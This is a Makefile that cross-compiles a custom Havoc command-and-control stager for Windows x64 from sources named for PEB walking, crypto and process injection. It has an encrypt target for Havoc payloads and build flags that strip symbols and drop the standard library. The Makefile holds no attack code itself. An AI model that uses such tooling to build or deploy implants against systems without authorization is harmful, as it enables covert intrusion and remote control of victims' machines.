# Custom Havoc Stager — Cross-Compile Makefile
# Build on Kali Linux for Windows x64

CC      = x86_64-w64-mingw32-gcc
CFLAGS  = -Wall -Os -fno-stack-protector -fomit-frame-pointer -fno-unwind-tables \
          -fno-asynchronous-unwind-tables -fmerge-all-constants \
          -I/usr/share/mingw-w64/include
LDFLAGS = -Wl,--strip-all -Wl,--entry=StagerEntry -nostdlib -lkernel32 -lwinhttp -lntdll

SRCDIR  = src
OBJDIR  = obj
BINDIR  = bin

SOURCES = $(SRCDIR)/stager.c $(SRCDIR)/peb.c $(SRCDIR)/crypto.c $(SRCDIR)/inject.c
OBJECTS = $(patsubst $(SRCDIR)/%.c,$(OBJDIR)/%.o,$(SOURCES))
TARGET  = $(BINDIR)/stager.exe

.PHONY: all clean dirs

all: dirs $(TARGET)

dirs:
	@mkdir -p $(OBJDIR) $(BINDIR)

$(TARGET): $(OBJECTS)
	$(CC) $(OBJECTS) -o $@ $(LDFLAGS)
	@echo "[+] Stager built: $@"
	@ls -la $@

$(OBJDIR)/%.o: $(SRCDIR)/%.c
	$(CC) $(CFLAGS) -c $< -o $@

clean:
	rm -rf $(OBJDIR) $(BINDIR)

# Convenience: encrypt a Havoc payload for the stager
encrypt:
	@echo "Usage: go run cmd/encrypt/main.go -in payload.bin -out payload.enc -key <32-byte-hex>"
